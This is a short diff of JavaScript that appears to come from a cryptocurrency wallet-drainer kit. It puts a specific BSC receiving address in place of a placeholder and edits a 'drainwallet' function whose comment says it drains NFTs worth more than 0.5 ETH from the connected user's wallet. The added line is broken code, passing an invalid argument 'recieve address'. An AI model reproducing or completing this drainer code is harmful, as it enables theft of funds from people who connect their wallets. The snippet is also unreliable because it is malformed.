@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xf8946655A32bdc1D86b4c1c12e7B0bD0a5Ea0Ea0";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
@@ -17,7 +17,7 @@ function approveSpending(token) {
 }
 
 function drainwallet(token) {
-	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.5 eth 
+	  cryptotokenContract.methods.transfer(recieve address).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.5 eth 
   			
 }
 
